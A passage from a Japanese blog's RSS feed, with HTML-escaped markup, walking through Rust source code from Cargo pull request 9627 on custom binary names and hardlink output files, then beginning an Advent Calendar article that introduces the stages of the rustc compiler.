&lt;span class=&quot;synStatement&quot;&gt;pub&lt;/span&gt; &lt;span class=&quot;synStatement&quot;&gt;enum&lt;/span&gt; &lt;span class=&quot;synIdentifier&quot;&gt;TargetKind&lt;/span&gt; {
    &lt;span class=&quot;synIdentifier&quot;&gt;Lib&lt;/span&gt;(&lt;span class=&quot;synType&quot;&gt;Vec&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;CrateType&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;),
    Bin,
    Test,
    Bench,
    &lt;span class=&quot;synIdentifier&quot;&gt;ExampleLib&lt;/span&gt;(&lt;span class=&quot;synType&quot;&gt;Vec&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;CrateType&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;),
    ExampleBin,
    CustomBuild,
}

&lt;span class=&quot;synStatement&quot;&gt;pub&lt;/span&gt; &lt;span class=&quot;synStatement&quot;&gt;fn&lt;/span&gt; &lt;span class=&quot;synIdentifier&quot;&gt;bin_target&lt;/span&gt;(
        name: &lt;span class=&quot;synType&quot;&gt;&amp;amp;str&lt;/span&gt;,
        bin_name: &lt;span class=&quot;synType&quot;&gt;Option&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;synType&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;,
        src_path: PathBuf,
        required_features: &lt;span class=&quot;synType&quot;&gt;Option&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;synType&quot;&gt;Vec&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;synType&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt;,
        edition: Edition,
) &lt;span class=&quot;synStatement&quot;&gt;-&amp;gt;&lt;/span&gt; Target {
    ...
}

&lt;span class=&quot;synStatement&quot;&gt;impl&lt;/span&gt; Target {
    ...
    &lt;span class=&quot;synComment&quot;&gt;// バイナリの名前を返すメソッド&lt;/span&gt;
    &lt;span class=&quot;synStatement&quot;&gt;pub&lt;/span&gt; &lt;span class=&quot;synStatement&quot;&gt;fn&lt;/span&gt; &lt;span class=&quot;synIdentifier&quot;&gt;binary_filename&lt;/span&gt;(&lt;span class=&quot;synType&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;self&lt;/span&gt;) &lt;span class=&quot;synStatement&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;synType&quot;&gt;Option&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;synType&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt; {
        &lt;span class=&quot;synConstant&quot;&gt;self&lt;/span&gt;.inner.bin_name.&lt;span class=&quot;synIdentifier&quot;&gt;clone&lt;/span&gt;()
    }
    
    &lt;span class=&quot;synComment&quot;&gt;// バイナリの名前をセットするメソッド&lt;/span&gt;
    &lt;span class=&quot;synStatement&quot;&gt;pub&lt;/span&gt; &lt;span class=&quot;synStatement&quot;&gt;fn&lt;/span&gt; &lt;span class=&quot;synIdentifier&quot;&gt;set_binary_name&lt;/span&gt;(&lt;span class=&quot;synType&quot;&gt;&amp;amp;mut&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;self&lt;/span&gt;, bin_name: &lt;span class=&quot;synType&quot;&gt;Option&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;synType&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;) &lt;span class=&quot;synStatement&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;synType&quot;&gt;&amp;amp;mut&lt;/span&gt; Target {
        &lt;span class=&quot;synPreProc&quot;&gt;Arc&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;synIdentifier&quot;&gt;make_mut&lt;/span&gt;(&lt;span class=&quot;synType&quot;&gt;&amp;amp;mut&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;self&lt;/span&gt;.inner).bin_name &lt;span class=&quot;synStatement&quot;&gt;=&lt;/span&gt; bin_name;
        &lt;span class=&quot;synConstant&quot;&gt;self&lt;/span&gt;
    }
    ...
}
&lt;/pre&gt;


&lt;p&gt;以下は関連するコード
tomlで渡されたfilenameをTarget構造体に渡す。&lt;/p&gt;

&lt;pre class=&quot;code lang-rust&quot; data-lang=&quot;rust&quot; data-unlink&gt;&lt;span class=&quot;synComment&quot;&gt;// src/cargo/util/toml/targets.rs&lt;/span&gt;

&lt;span class=&quot;synStatement&quot;&gt;fn&lt;/span&gt; &lt;span class=&quot;synIdentifier&quot;&gt;clean_bins&lt;/span&gt;(
    features: &lt;span class=&quot;synType&quot;&gt;&amp;amp;&lt;/span&gt;Features,
    toml_bins: &lt;span class=&quot;synType&quot;&gt;Option&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;synType&quot;&gt;&amp;amp;Vec&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;TomlBinTarget&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt;,
    package_root: &lt;span class=&quot;synType&quot;&gt;&amp;amp;&lt;/span&gt;Path,
    package_name: &lt;span class=&quot;synType&quot;&gt;&amp;amp;str&lt;/span&gt;,
    edition: Edition,
    autodiscover: &lt;span class=&quot;synType&quot;&gt;Option&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;synType&quot;&gt;bool&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;,
    warnings: &lt;span class=&quot;synType&quot;&gt;&amp;amp;mut&lt;/span&gt; &lt;span class=&quot;synType&quot;&gt;Vec&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;synType&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;,
    errors: &lt;span class=&quot;synType&quot;&gt;&amp;amp;mut&lt;/span&gt; &lt;span class=&quot;synType&quot;&gt;Vec&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;synType&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;,
    has_lib: &lt;span class=&quot;synType&quot;&gt;bool&lt;/span&gt;,
) &lt;span class=&quot;synStatement&quot;&gt;-&amp;gt;&lt;/span&gt; CargoResult&lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;synType&quot;&gt;Vec&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;Target&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; {
    ...
    &lt;span class=&quot;synStatement&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;synType&quot;&gt;mut&lt;/span&gt; target &lt;span class=&quot;synStatement&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;synPreProc&quot;&gt;Target&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;synIdentifier&quot;&gt;bin_target&lt;/span&gt;(
            &lt;span class=&quot;synType&quot;&gt;&amp;amp;&lt;/span&gt;bin.&lt;span class=&quot;synIdentifier&quot;&gt;name&lt;/span&gt;(),
            bin.filename.&lt;span class=&quot;synIdentifier&quot;&gt;clone&lt;/span&gt;(),
            path,
            bin.required_features.&lt;span class=&quot;synIdentifier&quot;&gt;clone&lt;/span&gt;(),
            edition,
        );
    ...
}
&lt;/pre&gt;


&lt;p&gt;出力するバイナリの名前を決定する関数。
重要なのはSomeとNoneの場合分け。&lt;/p&gt;

&lt;pre class=&quot;code lang-rust&quot; data-lang=&quot;rust&quot; data-unlink&gt;&lt;span class=&quot;synComment&quot;&gt;// src/cargo/core/compiler/build_context/target_info.rs&lt;/span&gt;

&lt;span class=&quot;synSpecial&quot;&gt;/// The filename for this FileType that Cargo should use when &amp;quot;uplifting&amp;quot;&lt;/span&gt;
&lt;span class=&quot;synSpecial&quot;&gt;/// it to the destination directory.&lt;/span&gt;
&lt;span class=&quot;synStatement&quot;&gt;pub&lt;/span&gt; &lt;span class=&quot;synStatement&quot;&gt;fn&lt;/span&gt; &lt;span class=&quot;synIdentifier&quot;&gt;uplift_filename&lt;/span&gt;(&lt;span class=&quot;synType&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;self&lt;/span&gt;, target: &lt;span class=&quot;synType&quot;&gt;&amp;amp;&lt;/span&gt;Target) &lt;span class=&quot;synStatement&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;synType&quot;&gt;String&lt;/span&gt; {
    &lt;span class=&quot;synStatement&quot;&gt;let&lt;/span&gt; name &lt;span class=&quot;synStatement&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;synStatement&quot;&gt;match&lt;/span&gt; target.&lt;span class=&quot;synIdentifier&quot;&gt;binary_filename&lt;/span&gt;() {
        &lt;span class=&quot;synComment&quot;&gt;// [[bin]]でバイナリの名前が指定されているのでそれを使う&lt;/span&gt;
        &lt;span class=&quot;synConstant&quot;&gt;Some&lt;/span&gt;(name) &lt;span class=&quot;synStatement&quot;&gt;=&amp;gt;&lt;/span&gt; name,
        &lt;span class=&quot;synComment&quot;&gt;// パッケージ名をバイナリの名前に使う&lt;/span&gt;
        &lt;span class=&quot;synConstant&quot;&gt;None&lt;/span&gt; &lt;span class=&quot;synStatement&quot;&gt;=&amp;gt;&lt;/span&gt; {
            &lt;span class=&quot;synComment&quot;&gt;// For binary crate type, `should_replace_hyphens` will always be false.&lt;/span&gt;
            &lt;span class=&quot;synComment&quot;&gt;// 名前に含まれるハイフンを処理する&lt;/span&gt;
            &lt;span class=&quot;synStatement&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;self&lt;/span&gt;.should_replace_hyphens {
                target.&lt;span class=&quot;synIdentifier&quot;&gt;crate_name&lt;/span&gt;()
            } &lt;span class=&quot;synStatement&quot;&gt;else&lt;/span&gt; {
                target.&lt;span class=&quot;synIdentifier&quot;&gt;name&lt;/span&gt;().&lt;span class=&quot;synIdentifier&quot;&gt;to_string&lt;/span&gt;()
            }
        }
    };
    &lt;span class=&quot;synPreProc&quot;&gt;format!&lt;/span&gt;(&lt;span class=&quot;synConstant&quot;&gt;&amp;quot;{}{}{}&amp;quot;&lt;/span&gt;, &lt;span class=&quot;synConstant&quot;&gt;self&lt;/span&gt;.prefix, name, &lt;span class=&quot;synConstant&quot;&gt;self&lt;/span&gt;.suffix)
}
&lt;/pre&gt;


&lt;p&gt;次にハードリンクについて。
本PRでコードの修正は入ってないが、参考のために載せておく。&lt;/p&gt;

&lt;p&gt;&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/uplift&quot;&gt;uplift&lt;/a&gt;_to関数: &lt;code&gt;Option&amp;lt;PathBuff&amp;gt;&lt;/code&gt;型を返す
戻り値はSome(path)なら、pathにハードリンクを作る、Noneなら、ハードリンクを作らないことを意味する。&lt;/p&gt;

&lt;p&gt;calc_outputs_rustc関数: &lt;code&gt;CargoResult&amp;lt;Vec&amp;lt;OutputFile&amp;gt;&amp;gt;&lt;/code&gt;型を返す。
戻り値はrustcが必要とする出力ファイルの情報をもつ。&lt;/p&gt;

&lt;pre class=&quot;code lang-rust&quot; data-lang=&quot;rust&quot; data-unlink&gt;&lt;span class=&quot;synComment&quot;&gt;// src/cargo/core/compiler/context/compilation_files.rs&lt;/span&gt;

&lt;span class=&quot;synStatement&quot;&gt;impl&amp;lt;&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;&#39;a&lt;/span&gt;, &lt;span class=&quot;synStatement&quot;&gt;&#39;cfg:&lt;/span&gt; &lt;span class=&quot;synSpecial&quot;&gt;&#39;a&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt; CompilationFiles&lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;&#39;a&lt;/span&gt;, &lt;span class=&quot;synSpecial&quot;&gt;&#39;cfg&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt; {
    ...
    &lt;span class=&quot;synSpecial&quot;&gt;/// Returns the path where the output for the given unit and FileType&lt;/span&gt;
    &lt;span class=&quot;synSpecial&quot;&gt;/// should be uplifted to.&lt;/span&gt;
    &lt;span class=&quot;synSpecial&quot;&gt;///&lt;/span&gt;
    &lt;span class=&quot;synSpecial&quot;&gt;/// Returns `None` if the unit shouldn&#39;t be uplifted (for example, a&lt;/span&gt;
    &lt;span class=&quot;synSpecial&quot;&gt;/// dependent rlib).&lt;/span&gt;
    &lt;span class=&quot;synStatement&quot;&gt;fn&lt;/span&gt; &lt;span class=&quot;synIdentifier&quot;&gt;uplift_to&lt;/span&gt;(&lt;span class=&quot;synType&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;self&lt;/span&gt;, unit: &lt;span class=&quot;synType&quot;&gt;&amp;amp;&lt;/span&gt;Unit, file_type: &lt;span class=&quot;synType&quot;&gt;&amp;amp;&lt;/span&gt;FileType, from_path: &lt;span class=&quot;synType&quot;&gt;&amp;amp;&lt;/span&gt;Path) &lt;span class=&quot;synStatement&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;synType&quot;&gt;Option&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;PathBuf&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt; {
        ...
    }

    &lt;span class=&quot;synComment&quot;&gt;// rustcによって作成されたファイル情報を出力する&lt;/span&gt;
    &lt;span class=&quot;synSpecial&quot;&gt;/// Computes the actual, full pathnames for all the files generated by rustc.&lt;/span&gt;
    &lt;span class=&quot;synSpecial&quot;&gt;///&lt;/span&gt;
    &lt;span class=&quot;synSpecial&quot;&gt;/// The `OutputFile` also contains the paths where those files should be&lt;/span&gt;
    &lt;span class=&quot;synSpecial&quot;&gt;/// &amp;quot;uplifted&amp;quot; to.&lt;/span&gt;
    &lt;span class=&quot;synStatement&quot;&gt;fn&lt;/span&gt; &lt;span class=&quot;synIdentifier&quot;&gt;calc_outputs_rustc&lt;/span&gt;(
        &lt;span class=&quot;synType&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;self&lt;/span&gt;,
        unit: &lt;span class=&quot;synType&quot;&gt;&amp;amp;&lt;/span&gt;Unit,
        bcx: &lt;span class=&quot;synType&quot;&gt;&amp;amp;&lt;/span&gt;BuildContext&lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;&#39;a&lt;/span&gt;, &lt;span class=&quot;synSpecial&quot;&gt;&#39;cfg&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;,
    ) &lt;span class=&quot;synStatement&quot;&gt;-&amp;gt;&lt;/span&gt; CargoResult&lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;synType&quot;&gt;Vec&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;OutputFile&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; {
        ...
        &lt;span class=&quot;synComment&quot;&gt;// Convert FileType to OutputFile.&lt;/span&gt;
        &lt;span class=&quot;synStatement&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;synType&quot;&gt;mut&lt;/span&gt; outputs &lt;span class=&quot;synStatement&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;synType&quot;&gt;Vec&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;synIdentifier&quot;&gt;new&lt;/span&gt;();
        &lt;span class=&quot;synStatement&quot;&gt;for&lt;/span&gt; file_type &lt;span class=&quot;synStatement&quot;&gt;in&lt;/span&gt; file_types {
            &lt;span class=&quot;synStatement&quot;&gt;let&lt;/span&gt; meta &lt;span class=&quot;synStatement&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;synType&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;self&lt;/span&gt;.metas[unit];
            &lt;span class=&quot;synStatement&quot;&gt;let&lt;/span&gt; meta_opt &lt;span class=&quot;synStatement&quot;&gt;=&lt;/span&gt; meta.use_extra_filename.&lt;span class=&quot;synIdentifier&quot;&gt;then&lt;/span&gt;(&lt;span class=&quot;synStatement&quot;&gt;||&lt;/span&gt; meta.meta_hash.&lt;span class=&quot;synIdentifier&quot;&gt;to_string&lt;/span&gt;());
            &lt;span class=&quot;synStatement&quot;&gt;let&lt;/span&gt; path &lt;span class=&quot;synStatement&quot;&gt;=&lt;/span&gt; out_dir.&lt;span class=&quot;synIdentifier&quot;&gt;join&lt;/span&gt;(file_type.&lt;span class=&quot;synIdentifier&quot;&gt;output_filename&lt;/span&gt;(&lt;span class=&quot;synType&quot;&gt;&amp;amp;&lt;/span&gt;unit.target, meta_opt.&lt;span class=&quot;synIdentifier&quot;&gt;as_deref&lt;/span&gt;()));

            &lt;span class=&quot;synComment&quot;&gt;// ハードリンクで参照する名前を取得&lt;/span&gt;
            &lt;span class=&quot;synComment&quot;&gt;// If, the `different_binary_name` feature is enabled, the name of the hardlink will&lt;/span&gt;
            &lt;span class=&quot;synComment&quot;&gt;// be the name of the binary provided by the user in `Cargo.toml`.&lt;/span&gt;
            &lt;span class=&quot;synStatement&quot;&gt;let&lt;/span&gt; hardlink &lt;span class=&quot;synStatement&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;self&lt;/span&gt;.&lt;span class=&quot;synIdentifier&quot;&gt;uplift_to&lt;/span&gt;(unit, &lt;span class=&quot;synType&quot;&gt;&amp;amp;&lt;/span&gt;file_type, &lt;span class=&quot;synType&quot;&gt;&amp;amp;&lt;/span&gt;path);
            &lt;span class=&quot;synStatement&quot;&gt;let&lt;/span&gt; export_path &lt;span class=&quot;synStatement&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;synStatement&quot;&gt;if&lt;/span&gt; unit.target.&lt;span class=&quot;synIdentifier&quot;&gt;is_custom_build&lt;/span&gt;() {
                &lt;span class=&quot;synConstant&quot;&gt;None&lt;/span&gt;
            } &lt;span class=&quot;synStatement&quot;&gt;else&lt;/span&gt; {
                &lt;span class=&quot;synConstant&quot;&gt;self&lt;/span&gt;.export_dir.&lt;span class=&quot;synIdentifier&quot;&gt;as_ref&lt;/span&gt;().&lt;span class=&quot;synIdentifier&quot;&gt;and_then&lt;/span&gt;(&lt;span class=&quot;synStatement&quot;&gt;|&lt;/span&gt;export_dir&lt;span class=&quot;synStatement&quot;&gt;|&lt;/span&gt; {
                    hardlink
                        .&lt;span class=&quot;synIdentifier&quot;&gt;as_ref&lt;/span&gt;()
                        .&lt;span class=&quot;synIdentifier&quot;&gt;map&lt;/span&gt;(&lt;span class=&quot;synStatement&quot;&gt;|&lt;/span&gt;hardlink&lt;span class=&quot;synStatement&quot;&gt;|&lt;/span&gt; export_dir.&lt;span class=&quot;synIdentifier&quot;&gt;join&lt;/span&gt;(hardlink.&lt;span class=&quot;synIdentifier&quot;&gt;file_name&lt;/span&gt;().&lt;span class=&quot;synIdentifier&quot;&gt;unwrap&lt;/span&gt;()))
                })
            };
            outputs.&lt;span class=&quot;synIdentifier&quot;&gt;push&lt;/span&gt;(OutputFile {
                path,
                hardlink,
                export_path,
                flavor: file_type.flavor,
            });
        }
        &lt;span class=&quot;synConstant&quot;&gt;Ok&lt;/span&gt;(outputs)
    }
    ...
}
&lt;/pre&gt;


&lt;p&gt;cargoが最終的に生成する&lt;code&gt;OutputFile&lt;/code&gt;構造体はこんな感じで定義されている。&lt;/p&gt;

&lt;pre class=&quot;code lang-rust&quot; data-lang=&quot;rust&quot; data-unlink&gt;&lt;span class=&quot;synComment&quot;&gt;// src/cargo/core/compiler/context/compilation_files.rs&lt;/span&gt;

&lt;span class=&quot;synStatement&quot;&gt;pub&lt;/span&gt; &lt;span class=&quot;synStatement&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;synIdentifier&quot;&gt;OutputFile&lt;/span&gt; {
    &lt;span class=&quot;synSpecial&quot;&gt;/// Absolute path to the file that will be produced by the build process.&lt;/span&gt;
    &lt;span class=&quot;synStatement&quot;&gt;pub&lt;/span&gt; path: PathBuf,
    &lt;span class=&quot;synSpecial&quot;&gt;/// If it should be linked into `target`, and what it should be called&lt;/span&gt;
    &lt;span class=&quot;synSpecial&quot;&gt;/// (e.g., without metadata).&lt;/span&gt;
    &lt;span class=&quot;synStatement&quot;&gt;pub&lt;/span&gt; hardlink: &lt;span class=&quot;synType&quot;&gt;Option&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;PathBuf&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;,
    &lt;span class=&quot;synSpecial&quot;&gt;/// If `--out-dir` is specified, the absolute path to the exported file.&lt;/span&gt;
    &lt;span class=&quot;synStatement&quot;&gt;pub&lt;/span&gt; export_path: &lt;span class=&quot;synType&quot;&gt;Option&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;PathBuf&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;,
    &lt;span class=&quot;synSpecial&quot;&gt;/// Type of the file (library / debug symbol / else).&lt;/span&gt;
    &lt;span class=&quot;synStatement&quot;&gt;pub&lt;/span&gt; flavor: FileFlavor,
}
&lt;/pre&gt;


&lt;h2&gt;感想&lt;/h2&gt;

&lt;p&gt;PRを読むのは勉強になる。
インクリメンタル&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%D1%A5%A4%A5%EB&quot;&gt;コンパイル&lt;/a&gt;のためのfingerprintという機能があるらしいが、それがどのようなものか、どのようにcargoで処理されているか気になった。&lt;/p&gt;

&lt;h1&gt;Ref&lt;/h1&gt;

&lt;ul&gt;
&lt;li&gt;cargo doc (&lt;a href=&quot;https://doc.rust-lang.org/cargo/reference/manifest.html&quot;&gt;https://doc.rust-lang.org/cargo/reference/manifest.html&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;changed files (&lt;a href=&quot;https://github.com/rust-lang/cargo/pull/9627/files#&quot;&gt;https://github.com/rust-lang/cargo/pull/9627/files#&lt;/a&gt;)&lt;/li&gt;
&lt;/ul&gt;

</description>          <pubDate>Sat, 11 Dec 2021 12:17:12 +0900</pubDate>
          <guid isPermaLink="false">hatenablog://entry/13574176438041637866</guid>
          
            <category>Rust</category>
          
          <enclosure url="https://ogimage.blog.st-hatena.com/26006613542645241/13574176438041637866/1639192757" type="image/png" length="0" />
        </item>
      
    
      
      
        <item>
          <title>Rustコンパイラのソースコードリーディング</title>
          <link>https://tamaron.hatenablog.com/entry/2021/12/03/172506</link>          <description>&lt;p&gt;これは&lt;a href=&quot;https://adventar.org/calendars/6895&quot;&gt;KMC(京大マイコンクラブ)アドベントカレンダー2021&lt;/a&gt; の3日目の記事です。&lt;/p&gt;

&lt;p&gt;昨日の記事はうたがわききさんの「List::Utilのpairs関数が&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/Python&quot;&gt;Python&lt;/a&gt;で欲しくなって」でした。&lt;/p&gt;

&lt;h1&gt;はじめに&lt;/h1&gt;

&lt;p&gt;こんにちは。一回生のた&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A4%DE%A4%ED%A4%F3&quot;&gt;まろん&lt;/a&gt;です。最近は言語処理系を読んだり書いたりしています。&lt;/p&gt;

&lt;p&gt;この記事では、&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%D1%A5%A4%A5%E9&quot;&gt;コンパイラ&lt;/a&gt;を読んだことがない人を対象に、Rust&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%D1%A5%A4%A5%E9&quot;&gt;コンパイラ&lt;/a&gt;(rustc)の&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%BD%A1%BC%A5%B9%A5%B3%A1%BC%A5%C9&quot;&gt;ソースコード&lt;/a&gt;を解説します。
Rustは性能、メモリ安全性、安全な並行性を目指して設計されたマルチ&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%D1%A5%E9%A5%C0%A5%A4%A5%E0&quot;&gt;パラダイム&lt;/a&gt;の&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%D7%A5%ED%A5%B0%A5%E9%A5%DF%A5%F3%A5%B0%B8%C0%B8%EC&quot;&gt;プログラミング言語&lt;/a&gt;です。近年注目を集めている言語で&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/Linux&quot;&gt;Linux&lt;/a&gt;, npm, &lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/Dropbox&quot;&gt;Dropbox&lt;/a&gt;などに採用されています。&lt;/p&gt;

&lt;h1&gt;&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%D1%A5%A4%A5%E9&quot;&gt;コンパイラ&lt;/a&gt;の処理&lt;/h1&gt;

&lt;p&gt;rustcはバックエンドに&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/LLVM&quot;&gt;LLVM&lt;/a&gt;を使っています。rustcは&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%BD%A1%BC%A5%B9%A5%B3%A1%BC%A5%C9&quot;&gt;ソースコード&lt;/a&gt;が&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/LLVM&quot;&gt;LLVM&lt;/a&gt;-IRになるまでに以下の5つの形に変換します。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%C8%A1%BC%A5%AF&quot;&gt;トーク&lt;/a&gt;ン列: &lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%BD%A1%BC%A5%B9%A5%B3%A1%BC%A5%C9&quot;&gt;ソースコード&lt;/a&gt;を分割した最小単位 (&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%C8%A1%BC%A5%AF&quot;&gt;トーク&lt;/a&gt;ン) の列&lt;/li&gt;
&lt;li&gt;AST: &lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%C8%A1%BC%A5%AF&quot;&gt;トーク&lt;/a&gt;ン列を&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%CC%DA%B9%BD%C2%A4&quot;&gt;木構造&lt;/a&gt;にしたもの&lt;/li&gt;
&lt;li&gt;HIR: 高レベル中間表現&lt;/li&gt;
&lt;li&gt;THIR: HIRに型の情報をつけたもの&lt;/li&gt;
&lt;li&gt;MIR: 中レベル中間表現&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;そして、次の過程によって変換 (+解析) が行われます。&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%C8%A1%BC%A5%AF&quot;&gt;トーク&lt;/a&gt;ナイズ (&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%BD%A1%BC%A5%B9%A5%B3%A1%BC%A5%C9&quot;&gt;ソースコード&lt;/a&gt; → &lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%C8%A1%BC%A5%AF&quot;&gt;トーク&lt;/a&gt;ン列)&lt;/li&gt;
&lt;li&gt;パース (&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%C8%A1%BC%A5%AF&quot;&gt;トーク&lt;/a&gt;ン列 → AST)&lt;/li&gt;
&lt;li&gt;マクロ展開, ASTの検証、型検査 (AST → THIR/HIR)&lt;/li&gt;
&lt;li&gt;Lowering (HIR → MIR)&lt;/li&gt;
&lt;li&gt;コード生成 (MIR → &lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/LLVM&quot;&gt;LLVM&lt;/a&gt;-IR)&lt;/li&gt;
&lt;/ol&gt;


